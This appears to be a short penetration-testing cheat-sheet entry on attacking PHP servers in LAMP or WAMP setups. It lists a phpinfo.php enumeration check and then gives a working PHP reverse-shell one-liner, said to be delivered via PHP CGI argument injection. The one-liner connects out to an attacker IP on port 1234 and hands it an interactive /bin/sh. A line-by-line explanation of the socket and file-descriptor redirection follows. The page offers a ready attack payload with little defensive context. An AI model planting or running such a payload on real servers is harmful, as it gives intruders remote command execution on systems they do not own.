
# Overview
Part of the common LAMP stack. (Linux, Apache, MySQL, PHP) Can also be windows based with WAMP

# Tools
## Website enumeration
`http://<target>/phpinfo.php` : can see if php file is leftover from installation


Reverse-shell from PHP CGI argument injection
```php
<?php $sock=fsockopen("<IP>" ,1234);exec("/bin/sh -i <&4 >&4 2>&4");?>
```
### Explanation:

1. **`fsockopen("<IP>", 1234)`**:
    - This function opens a TCP connection to a specified IP address (`<IP>`) on port `1234`.
    - The target (attacker's) system listens on that IP and port, waiting for an incoming connection.
    - The `$sock` variable represents the socket connection established between the attacked server and the attacker.
2. **`exec("/bin/sh -i <&4 >&4 2>&4");`**:
    - This runs the `exec` function, which executes a command on the system where the PHP script is running.
    - The command `/bin/sh -i` starts an interactive shell (`-i` option).
    - The file descriptors `<&4`, `>&4`, and `2>&4` mean:
        - `<&4`: Redirect standard input (`stdin`) from file descriptor 4 (which is connected to the socket).
        - `>&4`: Redirect standard output (`stdout`) to the socket (descriptor 4).
        - `2>&4`: Redirect standard error (`stderr`) to the same socket.